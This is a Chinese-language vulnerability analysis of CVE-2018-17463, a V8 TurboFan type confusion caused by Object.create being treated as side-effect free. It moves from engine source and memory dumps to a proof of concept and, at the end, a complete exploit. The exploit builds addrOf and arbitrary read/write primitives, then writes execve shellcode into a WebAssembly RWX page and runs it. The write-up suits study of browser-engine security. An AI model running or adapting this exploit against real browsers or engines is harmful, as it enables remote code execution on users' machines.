## CVE-2018-17463

在分析漏洞之前需要先学习两个基础知识，推断优化(speculative optimization)和冗余消除(Redundancy Elimination)。

### 推断优化

参考链接https://blog.csdn.net/szengtal/article/details/79809909

我们之前在学习IC（内联缓存）时，对map有了初步的认识，推断优化指的 TurboFan 利用之前字节码运⾏时收集的信息进⾏行行优化，最主要的策略略是假设对象的类型仍然
是之前运⾏时的对象类型，因此通过对象的 map ( hidden class )直接通过偏移来访问相应的属性。

我们这里来举个例子：
```function add(a: Smi, b: Smi) -> Smi { 
    return a + b;
}
```
这里v8会根据之前的缓存，直接判断两个相加的数为整数，也就不会考虑其他情况（object、double等）

最终生成：
```lea rax, [rdi+rsi]
jo bailout_integer_overflow 
ret
```

但是由于是对对象的类型进⾏行行推断，因此需要确保推断是正确的。一般来说需要确认对象的标志(pointer tag)是正确的，以及对象的 map 是正确的。故需要在具体访问对象属性前加入一段代码来确保相应的推断是正确的，这段代码称为speculation guard，如下所示:
```; Ensure is Smi
test    rdi, 0x1
jnz     bailout

; Ensure has expected Map
cmp QWORD PTR [rdi-0x1], 0x12345601 
jne bailout
```
第⼀段代码通过判断数据的pointer tag末位是0,来确认其是smi 。第二段代码则是⽤用来判断⼀个HeapObject对象是否是相应的map来验证是否是相应的对象。当不不满⾜足其相应的条件时，就会跳转到 bailout 进⾏行行优化回滚(deoptimization)，重新恢复成能处理所有情况的代码。

### 冗余消除(Redundancy Elimination)

在进行优化的过程中有一个阶段叫做冗余消除，即当v8认为某个speculation guard是多余的时候会将其消除。 

如下面一段代码，是同⼀对象的两个属性相加。
```function foo(o) { 
    return o.a + o.b;
}
```
一开始的ir图：
```CheckHeapObject o 
CheckMap o, map1
r0 = Load [o + 0x18]

CheckHeapObject o 
CheckMap o, map1
r1 = Load [o + 0x20]

r2 = Add r0, r1 
CheckNoOverflow 
Return r2
```

很明显的可以看到第二个CheckHeapObject以及CheckMap是多余的，在这两个check之间对象的类型以及map都没有发生变化。

针对这种情况，v8利用Redundancy Elimination来消除多余的check，形成的IR如下:
```CheckHeapObject o 
CheckMap o, map1
r0 = Load [o + 0x18]

r1 = Load [o + 0x20]

r2 = Add r0, r1 
CheckNoOverflow 
Return r2
```

### Root case

上面的冗余消除中说到了，因为这个阶段主要是消除一些多余的类型检测，但是这个就需要v8去判断两个相同的check之间的结点是否会对相应对象的类型形成变化，他就要求v8要知道所有IR结点的副作用(side effect)，以推断是否会对类型造成变化。

⼀旦该进行的检查被去掉了，就会导致非预期的结果，最典型的就是利⽤冗余消除的漏洞形成类型混淆漏洞，并最终进行利用。

和冗余消除相关的漏洞⼀个比较好的⽅法就是找出v8认为是不存在副作用的结点，并审计它相关的代码看其是不是真的不存在副作用，若能找到⼀个特例，则是找到了漏洞。这也是发现CVE-2018-17463的原理。

接下来就让我们去看看这个漏洞：

核心漏洞点：
```
V(CreateObject, Operator::kNoWrite, 1, 1)

 // src/compiler/operator.h:28
// Properties inform the operator-independent optimizer about legal // transformations for nodes that have this operator.
enum Property {
    kNoProperties = 0, 
    kCommutative = 1 << 0, // OP(a, b) == OP(b, a) for all inputs.
    kAssociative = 1 << 1, // OP(a, OP(b,c)) == OP(OP(a,b), c) for all inputs.
    kIdempotent = 1 << 2, // OP(a); OP(a) == OP(a).
    kNoRead = 1 << 3,     // Has no scheduling dependency on Effects
    kNoWrite = 1 << 4, 
    // Does not modify any Effects and thereby
    // create new scheduling dependencies.
    kNoThrow = 1 << 5,  // Can never generate an exception.
    kNoDeopt = 1 << 6,  // Can never generate an eager deoptimization exit.
    kFoldable = kNoRead | kNoWrite,
    kKontrol = kNoDeopt | kFoldable | kNoThrow,
    kEliminatable = kNoDeopt | kNoWrite | kNoThrow,
    kPure = kNoDeopt | kNoRead | kNoWrite | kNoThrow | kIdempotent
};
```
可以看到v8在这里认为CreateObject是kNoWrite，即不存在可见的副作用，无需记录到effect chain。

但是实际上CreateObject是可能会对对象的类型造成影响的。
```let o = {a: 42}; 
%DebugPrint(o); 
Object.create(o); 
%DebugPrint(o);


DebugPrint: 0x3d11dc40e1a9: [JS_OBJECT_TYPE]
- map: 0x0d61e230c981 <Map(HOLEY_ELEMENTS)> [FastProperties]
- prototype: 0x3c12f16846d9 <Object map = 0xd61e23022f1>
- elements: 0x16ba27882cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
- properties: 0x16ba27882cf1 <FixedArray[0]> {
    #a: 42 (data field 0)
}
DebugPrint: 0x3d11dc40e1a9: [JS_OBJECT_TYPE]
- map: 0x0d61e230ca21 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
- prototype: 0x3c12f16846d9 <Object map = 0xd61e23022f1>
- elements: 0x16ba27882cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
- properties: 0x3d11dc40e201 <NameDictionary[17]> {
#a: 42 (data, dict_index: 1, attrs: [WEC])
}
```
运⾏行行并查看结果，可以看到经过 Object.create 函数，对象 o 的 map 类型从 FastProperties 变成了 DictionaryProperties 。

#### map类型变化

我们来分析一下这个map类型的变化是如何导致的。

```
LowerJSCreateObject
 ->kCreateObjectWithoutProperties 
  ->Runtime::kObjectCreate
   ->JSObject::ObjectCreate
    ->Map::GetObjectCreateMap
     ->JSObject::OptimizeAsPrototype
      ->JSObject::NormalizeProperties
       ->Map::Normalize
          ->Map::CopyNormalized
       ->JSObject::NormalizeProperties
          ->MigrateToMap
```

我们从Createobject结点从javascript高级结点lowering的过程中找map发生变化的过程。

首先就是LowerJSCreateObject，它的作用如同名字一样，就是对jsobject做lower处理的。
```
//src/compiler/js-generic-lowering.cc:404
void JSGenericLowering::LowerJSCreateObject(Node* node) { CallDescriptor::Flags flags = FrameStateFlagForCall(node); Callable callable = Builtins::CallableFor(
      isolate(), Builtins::kCreateObjectWithoutProperties);
  ReplaceWithStubCall(node, callable, flags);
}
```
他主要调用了kCreateObjectWithoutProperties来替换当前结点。

Runtime::kObjectCreate函数中，在判断prototype的类型之后调用JSObject::ObjectCreate：
```
//src/runtime/runtime-object.cc:316
// ES6 section 19.1.2.2 Object.create ( O [ , Properties ] )
// TODO(verwaest): Support the common cases with precached map directly in // an Object.create stub.
RUNTIME_FUNCTION(Runtime_ObjectCreate) {
    HandleScope scope(isolate); 
    Handle<Object> prototype = args.at(0);  
    Handle<Object> properties = args.at(1);
    Handle<JSObject> obj;
    // 1. If Type(O) is neither Object nor Null, throw a TypeError exception. 
    if (!prototype->IsNull(isolate) && !prototype->IsJSReceiver()) {
        THROW_NEW_ERROR_RETURN_FAILURE(
        isolate, NewTypeError(MessageTemplate::kProtoObjectOrNull,prototype));
    }
    // 2. Let obj be ObjectCreate(O).
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    isolate, obj, JSObject::ObjectCreate(isolate, prototype));
    ...
    // 4. Return obj.
    return *obj;
}
```

Map::GetObjectCreateMap函数会对不是prototype类型的对象调用JSObject::OptimizeAsPrototype来进行优化。

```
//src/objects.cc:1360
// static
Handle<Map> Map::GetObjectCreateMap(Isolate* isolate, Handle<HeapObject> prototype) 
{ 
    Handle<Map> map(isolate->native_context()->object_function()->initial_map(), isolate);
    if (map->prototype() == *prototype) return map;
    if (prototype->IsNull(isolate)) {
        return isolate->slow_object_with_null_prototype_map();
    }
    if (prototype->IsJSObject()) {
        Handle<JSObject> js_prototype = Handle<JSObject>::cast(prototype); 
        if (!js_prototype->map()->is_prototype_map()) {
                JSObject::OptimizeAsPrototype(js_prototype); 
            }
            Handle<PrototypeInfo> info = Map::GetOrCreatePrototypeInfo(js_prototype, isolate);
            // TODO(verwaest): Use inobject slack tracking for this map.
            if (info->HasObjectCreateMap()) {
                map = handle(info->ObjectCreateMap(), isolate);
            } else {
                map = Map::CopyInitialMap(isolate, map);                
                Map::SetPrototype(isolate, map, prototype);             
                PrototypeInfo::SetObjectCreateMap(info, map);
            }
            return map; 
        }
    return Map::TransitionToPrototype(isolate, map, prototype);
}
```
接下来就是重头戏了，JSObject::OptimizeAsPrototype函数，看名字也能感觉到他和map类型千丝万缕的关系。
```
//src/objects.cc:12518
// static
void JSObject::OptimizeAsPrototype(Handle<JSObject> object, bool enable_setup_mode) 
{ 
    if (object->IsJSGlobalObject()) return;
    if (enable_setup_mode && PrototypeBenefitsFromNormalization(object)) 
    { 
        
        // First normalize to ensure all JSFunctions are DATA_CONSTANT. 
        JSObject::NormalizeProperties(object, KEEP_INOBJECT_PROPERTIES, 0, "NormalizeAsPrototype");
    }
    if (object->map()->is_prototype_map()) {
        if (object->map()->should_be_fast_prototype_map() && !object->HasFastProperties()) {
            JSObject::MigrateSlowToFast(object, 0, "OptimizeAsPrototype");
        }
    } else {
        ...
    } 
}
```

 JSObject::NormalizeProperties函数中，调⽤了Map::Normalize函数根据原有对象的map来⽣成新的new_map。
 
```
Handle<Map> new_map = Map::Normalize(object->GetIsolate(), map, mode, reason);
```

Map::Normalize则是通过调用Map::CopyNormalized来生成新的map。

```
//src/objects.cc:9247
Handle<Map> Map::CopyNormalized(Isolate* isolate, Handle<Map> map,
                                PropertyNormalizationMode mode) {
    int new_instance_size = map->instance_size(); 
    if (mode == CLEAR_INOBJECT_PROPERTIES) {
        new_instance_size -= map->GetInObjectProperties() * kPointerSize; 
        }
    Handle<Map> result = RawCopy( isolate, map, new_instance_size, mode == CLEAR_INOBJECT_PROPERTIES ? 0 : map->GetInObjectProperties());
    
    // Clear the unused_property_fields explicitly as this field should not 
    // be accessed for normalized maps. 
    result->SetInObjectUnusedPropertyFields(0); 
    result->set_is_dictionary_map(true); 
    result->set_is_migration_target(false); 
    result->set_may_have_interesting_symbols(true); 
    result->set_construction_counter(kNoSlackTracking);
    ...
  return result;
}
```

可以看到在Map::CopyNormalized函数中，通过RawCopy来⽣成新的map，并且通过result->set_is_dictionary_map(true);来给map设置dictionary标志位。
之后函数返回到JSObject::NormalizeProperties函数中，它调用了MigrateToMap(object, new_map, expected_additional_properties); 函数将参数 object从原来的map迁移到了new_map中，从而导致了对象map的改变。

JSObject::MigrateToMap定义如下，看到它调用了MigrateFastToSlow将对象迁移到了DictionaryProperties 。

```// src/objects.cc:4514

void JSObject::MigrateToMap(Handle<JSObject> object, Handle<Map> new_map, int expected_additional_properties) 
{
    if (object->map() == *new_map) return;
    Handle<Map> old_map(object->map(), object->GetIsolate());   
    NotifyMapChange(old_map, new_map, object->GetIsolate());
    
    if (old_map->is_dictionary_map()) { 
        ...
    } else if (!new_map->is_dictionary_map()) { 
        ...
    } else {
        MigrateFastToSlow(object, new_map, expected_additional_properties);
    }
  ...
 }   
```
可以看到由于dictionary标志位，导致了对象的map发生了改变，而v8认为该函数是kNoWrite的，没有副作用，这则会导致v8将本起作用的check消除掉。

所以我们接着去看ReduceCheckpoint

#### ReduceCheckpoint

在上面的冗余消除部分我们曾提过，当v8判断统一路径下的kCheckpoint是多余的，就会调用CheckpointElimination::ReduceCheckpoint来消除多余的checkpoint。

IsRedundantCheckpoint函数用来检查同路径下是否有多余的checkpoint。
```
//The given checkpoint is redundant if it is effect-wise dominated by another 
// checkpoint and there is no observable write in between. For now we consider 
// a linear effect chain only instead of true effect-wise dominance.

bool IsRedundantCheckpoint(Node* node) {
    Node* effect = NodeProperties::GetEffectInput(node); 
    while (effect->op()->HasProperty(Operator::kNoWrite) && effect->op()->EffectInputCount() == 1) {
        if (effect->opcode() == IrOpcode::kCheckpoint) return true;     
        effect = NodeProperties::GetEffectInput(effect);
    }
  return false;
}
```
此时v8认定对象为kNoWrite，表明次map没有副作用，就会接着遍历，这样就会将后面的IrOpcode::kCheckpoint判断为多余的。

```
Reduction CheckpointElimination::ReduceCheckpoint(Node* node) { 
    DCHECK_EQ(IrOpcode::kCheckpoint, node->opcode());
    if (IsRedundantCheckpoint(node)) {
        return Replace(NodeProperties::GetEffectInput(node));
    }
  return NoChange();
}

Reduction CheckpointElimination::Reduce(Node* node) { 
    DisallowHeapAccess no_heap_access;
    switch (node->opcode()) {
        case IrOpcode::kCheckpoint:
            return ReduceCheckpoint(node);
        default:
            break;
    }
  return NoChange();
}
```
之后就会在Reduce函数中ReduceCheckpoint。

#### 漏洞

前面说了那么多，想必这个漏洞就很好理解了。

首先总结一下成因：
CreateObject函数会改变对象的map类型，但是，v8认为该结点为kNoWrite的，所以在冗余消除时将有效的checkpoint消除掉，从而导致类型混淆，我们据此写出poc如下：
```
function foo()
{   
    function hax(o)
    {
        o.inline;
        Object.create(o);
        return o.outline;
    }
    
    for(let i = 0; i < 0x10000 ; i++)
    {
        let o = {inline : 0x6666};
        o.outline = 0x7777;
        if(hax(o) != 0x7777)
            return;
    }
    throw "[-] Not vulnerable"
}

foo()
print("[+] v8 version is vulnerable");
```
简单介绍一下，在hax函数中首先通过o.inline生成第一个checkpoint，之后通过createObject改变o的map类型，但是v8并没意识到它的类型发生改变，之后会在冗余消除中删除掉o.outline的checkpoint，之后按照old map中的偏移来进行访问，导致类型混淆。

### 利用

首先我们先来看看FastProperties和DictionaryProperties两种map类型的区别：
```
let a = {x : 1,y:2,z:3};
a.b = 4;
a.c = 5;
a.d = 6;
%DebugPrint(a);
%SystemBreak();
Object.create(a);
%DebugPrint(a);
%SystemBreak();
```
```
0x31132b18e1e9: [JS_OBJECT_TYPE]
 - map: 0x0bf82a48cb11 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2e853b0046d9 <Object map = 0xbf82a4822f1>
 - elements: 0x006338502cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x31132b18e389 <PropertyArray[3]> {
    #x: 1 (data field 0)
    #y: 2 (data field 1)
    #z: 3 (data field 2)
    #b: 4 (data field 3) properties[0]
    #c: 5 (data field 4) properties[1]
    #d: 6 (data field 5) properties[2]
 }
$1 = 0

0xbf82a48cb11: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 48
 - inobject properties: 3
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0bf82a48cac1 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x2e853b006459 <Cell value= 0>
 - instance descriptors (own) #6: 0x31132b18e449 <DescriptorArray[20]>
 - layout descriptor: (nil)
 - prototype: 0x2e853b0046d9 <Object map = 0xbf82a4822f1>
 - constructor: 0x2e853b004711 <JSFunction Object (sfi = 0x1a09a450aba9)>
 - dependent code: 0x006338502391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
```
此时存在3个inobject properties，对应{x : 1,y:2,z:3}，而之后定义的a、b、c则保存在了properties中。

inobject properties：
```
pwndbg> x /6gx 0x31132b18e1e8
0x31132b18e1e8: 0x00000bf82a48cb11  0x000031132b18e389
0x31132b18e1f8: 0x0000006338502cf1  0x0000000100000000
0x31132b18e208: 0x0000000200000000  0x0000000300000000
```
properties:
```
0x31132b18e389: [PropertyArray]
 - map: 0x006338503899 <Map>
 - length: 3
 - hash: 0
           0: 4
           1: 5
           2: 6
$3 = 0

0x31132b18e388: 0x0000006338503899  0x0000000300000000
0x31132b18e398: 0x0000000400000000  0x0000000500000000
0x31132b18e3a8: 0x0000000600000000
```

之后我们执行了CreateObject，看看改变后的结构：
```
pwndbg> v8print 0x31132b18e1e9
0x31132b18e1e9: [JS_OBJECT_TYPE]
 - map: 0x0bf82a48cbb1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x2e853b0046d9 <Object map = 0xbf82a4822f1>
 - elements: 0x006338502cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x31132b18e4f9 <NameDictionary[53]> {
   #z: 3 (data, dict_index: 3, attrs: [WEC])
   #d: 6 (data, dict_index: 6, attrs: [WEC])
   #b: 4 (data, dict_index: 4, attrs: [WEC])
   #c: 5 (data, dict_index: 5, attrs: [WEC])
   #y: 2 (data, dict_index: 2, attrs: [WEC])
   #x: 1 (data, dict_index: 1, attrs: [WEC])
 }
$4 = 0
```

此时在去寻找inobject properties，可以发现什么都找不到：
```
pwndbg> x /6gx 0x31132b18e1e8
0x31132b18e1e8: 0x00000bf82a48cbb1  0x000031132b18e4f9
0x31132b18e1f8: 0x0000006338502cf1  0x0000000000000000
0x31132b18e208: 0x0000000000000000  0x0000000000000000
```
而之前的properties则发生了很大的变化：
```
0x31132b18e4f9: [ObjectHashTable]
 - map: 0x006338503669 <Map>
 - length: 53
 - elements: 6
 - deleted: 0
 - capacity: 16
 - elements: {
           0: 7 -> 0
           1: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           2: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           3: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           4: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           5: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           6: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
           7: 0x1a09a4506971 <String[1]: z> -> 3
           8: 960 -> 0x0063385025a1 <undefined>
           9: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
          10: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
          11: 0x0063385025a1 <undefined> -> 0x1a09a45050a1 <String[1]: d>
          12: 6 -> 1728
          13: 0x2e853b022991 <String[1]: b> -> 4
          14: 1216 -> 0x0063385025a1 <undefined>
          15: 0x0063385025a1 <undefined> -> 0x0063385025a1 <undefined>
 }
$6 = 0
```
我们结合内存来分析一下此时的ObjectHashTable。
```
pwndbg> x /25gx 0x31132b18e4f8
0x31132b18e4f8: 0x0000006338503669 <- <Map>        0x0000003500000000 <- length
0x31132b18e508: 0x0000000600000000 <- elements     0x0000000000000000 <- deleted
0x31132b18e518: 0x0000001000000000 <- capacity     |0x0000000700000000
0x31132b18e528: 0x0000000000000000| <- elements 0  |0x00000063385025a1
0x31132b18e538: 0x00000063385025a1| <- elements 1  |0x00000063385025a1
0x31132b18e548: 0x00000063385025a1| <- elements 2  |0x00000063385025a1
0x31132b18e558: 0x00000063385025a1| <- elements 3  |0x00000063385025a1
0x31132b18e568: 0x00000063385025a1| <- elements 4  |0x00000063385025a1
0x31132b18e578: 0x00000063385025a1| <- elements 5  |0x00000063385025a1
0x31132b18e588: 0x00000063385025a1| <- elements 6  |0x00001a09a4506971
0x31132b18e598: 0x0000000300000000| <- elements 7  |0x000003c000000000
0x31132b18e5a8: 0x00000063385025a1| <- elements 8  |0x00000063385025a1
0x31132b18e5b8: 0x00000063385025a1| <- elements 9
```
对照注释应该可以搞清楚map变化带来的影响，DictionaryProperties会把全部的属性值都放到properties中存储，并将原先的线性结构改成hash表的字典结构。

##### 类型混淆
由于漏洞带来的类型混淆，将会导致访问对象同一属性时访问固定偏移。

再利用之前我们需要明白两个内容：

1、hash表是随机存储的，每次执行时他的偏移都不是固定的：
```
0x1a8ce618e1d1: [JS_OBJECT_TYPE]
 - map: 0x0e4ccda8cbb1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x2d0e328046d9 <Object map = 0xe4ccda822f1>
 - elements: 0x180c3d382cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1a8ce618e4e1 <NameDictionary[53]> {
   #c: 5 (data, dict_index: 5, attrs: [WEC])
   #d: 6 (data, dict_index: 6, attrs: [WEC])
   #x: 1 (data, dict_index: 1, attrs: [WEC])
   #y: 2 (data, dict_index: 2, attrs: [WEC])
   #z: 3 (data, dict_index: 3, attrs: [WEC])
   #b: 4 (data, dict_index: 4, attrs: [WEC])
 }
 
 
 0x1bf5b6e0e1d1: [JS_OBJECT_TYPE]
 - map: 0x2fc05030cbb1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x02b0bbe046d9 <Object map = 0x2fc0503022f1>
 - elements: 0x2d44edf02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1bf5b6e0e4e1 <NameDictionary[53]> {
   #y: 2 (data, dict_index: 2, attrs: [WEC])
   #c: 5 (data, dict_index: 5, attrs: [WEC])
   #z: 3 (data, dict_index: 3, attrs: [WEC])
   #b: 4 (data, dict_index: 4, attrs: [WEC])
   #d: 6 (data, dict_index: 6, attrs: [WEC])
   #x: 1 (data, dict_index: 1, attrs: [WEC])
 }
```

2、由于IC（内联缓存），我们再一次执行时构造相同的object，DictionaryProperties中的偏移是相同的。

所以在一次利用中只要找到一对可以用于类型混淆的属性名就可以作为先验知识一直使用了。

我们可以通过构建一个对象，其中把属性名和属性值设置为有规律的键值对，在恶意构造的函数中，返回全部可读的Properties值，通过其值的规律性，可以找到一对在属性改变先后可以对应的属性名X1、X2，达到恶意函数返回a.x1，实质上是返回a.X2的目的，从而造成类型混淆。

```
const NUM_PROPERTIES = 32;
const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

// Garbage collection is required to move objects to a stable position in
// memory (OldSpace) before leaking their addresses.
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

func = wasm_func();

function checkVuln(){
    function hax(o) {
        // forced a map check
        o.inline;

        // change the map, but v8 think it has no side-effect
        Object.create(o);

        return o.outline;
    }
    
    for (let i=0; i<MAX_ITERATIONS; i++){
        let o = {inline: 0x6666};
        o.outline = 0x7777;
        if(hax(o) !== 0x7777) {
            return;
        }
    }
    throw "[-] Not vulnerable"

}

// Make an object with one inline and numerous out-of-line properties.
function makeObj(propertyValues) {
    let o = {inline: 0x1337};
    for (let i = 0; i < NUM_PROPERTIES; i++) {
        Object.defineProperty(o, 'p' + i, {
            writable: true,
            value: propertyValues[i]
        });
    }
    //print(o);
    return o;
}

let p1, p2;
function findOverlappingProperties() {
    let propertyNames = [];
    for (let i = 0; i < NUM_PROPERTIES; i++) {
        propertyNames[i] = 'p' + i;
    }
    print(propertyNames);
    //%DebugPrint(propertyNames);
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\n')}
            return [${propertyNames.join(', ')}];
        }
    `);

    let propertyValues = [];
    for (let i = 1; i < NUM_PROPERTIES; i++) {
        // There are some unrelated, small-valued SMIs in the dictionary.
        // However they are all positive, so use negative SMIs. Don't use
        // -0 though, that would be represented as a double...
        propertyValues[i] = -i;
    }

    for (let i = 0; i < MAX_ITERATIONS; i++) {
        let r = hax(makeObj(propertyValues));
        //print(typeof r);
        //%DebugPrint(r);
        //readline();
        for (let i = 1; i < r.length; i++) {
            // Properties that overlap with themselves cannot be used.
            if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
                [p1, p2] = [i, -r[i]];
                return;
            }
        }
    }
   throw "Failed to find overlapping properties";
}

// addrOf primitive with type confusion vuln
let leakAddr;
function addrOf(obj)
{
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            return o.p${p1}.x1;
        }
    `);
    let propertyValues = [];
    propertyValues[p1] = {x1 : 13.37, x2 : 14.47};
    propertyValues[p2] = {y1: obj};
    for(let i=0; i<MAX_ITERATIONS; i++) {
        
        leakAddr = hax(makeObj(propertyValues));
        if (leakAddr !== 13.37) {
            return f2i(leakAddr)-1;
        }
    }
    throw "Addrof failed";
}

// overwrite backing store with type confusion vuln
var dataBuf = new ArrayBuffer(0x200);
var dataView = new DataView(dataBuf);
function overwriteDataBuf(addr)
{
    eval(`
        function hax(o, addr) {
            o.inline;
            this.Object.create(o);
            let tmp = o.p${p1}.x2;
            o.p${p1}.x2 = addr;
            return tmp
        }
    `);
    let propertyValues = [];
    propertyValues[p1] = {x1: 13.38, x2: 14.48};
    propertyValues[p2] = dataBuf;
    for(let i=0; i<MAX_ITERATIONS; i++) {
        propertyValues[p1].x2 = 14.48;
        let ret = hax(makeObj(propertyValues), i2f(addr));
        if (ret !== 14.48) {
            //console.log(hex(f2i(ret)));
            return;
        }
    }

    throw("Overwrite DataBuf backing store failed");
    
}

function dataViewRead64(addr)
{
    overwriteDataBuf(addr);
    let ret = dataView.getFloat64(0, true);
    //print(ret);
    return f2i(ret);
}

function dataViewWrite(addr, payload)
{
    overwriteDataBuf(addr);
    
    for(let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
}

function dataVieWrite64(addr, value)
{
    overwriteDataBuf(addr);
    dataView.setFloat64(0, f2i(value), true);
}



function pwn() 
{
    // step 1 check vuln first
    checkVuln();
    console.log("[+] v8 version is vulnerable");

    // step 2 find overlap properties
    findOverlappingProperties();
    print(`[+] Properties p${p1} and p${p2} overlap`);

    // step 3 gc to form a stable memory state
    gc();

    // step 4 arbitrary code execution with wasm object.
    var wasmObjAddr = addrOf(func);
    console.log("wasm object addr: 0x"+hex(wasmObjAddr));
    var sharedInfoAddr = dataViewRead64(wasmObjAddr+0x18) - 1;
    console.log("share info addr: 0x"+hex(sharedInfoAddr));
    var wasmExportedFunctionDataAddr = dataViewRead64(sharedInfoAddr+0x8) - 1;
    console.log("WasmExportedFunctionData addr: 0x"+hex(wasmExportedFunctionDataAddr));
    var instanceAddr = dataViewRead64(wasmExportedFunctionDataAddr+0x10) - 1;
    console.log("instance addr: 0x"+hex(instanceAddr));
    var rwx_addr = dataViewRead64(instanceAddr+0xf0);
    console.log("rwx addr: 0x"+hex(rwx_addr));
    
	var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    	96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    	105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    	72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    	72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    	184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    	94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    
    dataViewWrite(rwx_addr, shellcode);
	
    func();
    //%DebugPrint(dataBuf);
    //%DebugPrint(func);
    //%SystemBreak();
}

pwn();
```








 









